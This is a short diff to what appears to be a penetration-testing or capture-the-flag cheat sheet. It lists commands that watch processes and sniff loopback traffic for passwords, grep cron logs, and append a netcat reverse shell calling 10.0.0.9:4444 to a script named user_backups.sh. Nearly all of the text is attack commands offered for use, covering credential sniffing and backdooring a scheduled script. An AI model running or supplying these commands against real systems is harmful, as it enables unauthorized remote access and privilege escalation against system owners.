@@ -3,3 +3,9 @@ watch -n 1 "ps -aux | grep pass"
 
 # TCP Dump in Ascii at interface loopback, grepping for pass:
 sudo tcpdump -i lo -A | grep "pass"
+
+# Check Crontab logs:
+grep "CRON" /var/log/syslog
+
+# RevShell on script:
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.9 4444 >/tmp/f" >> user_backups.sh
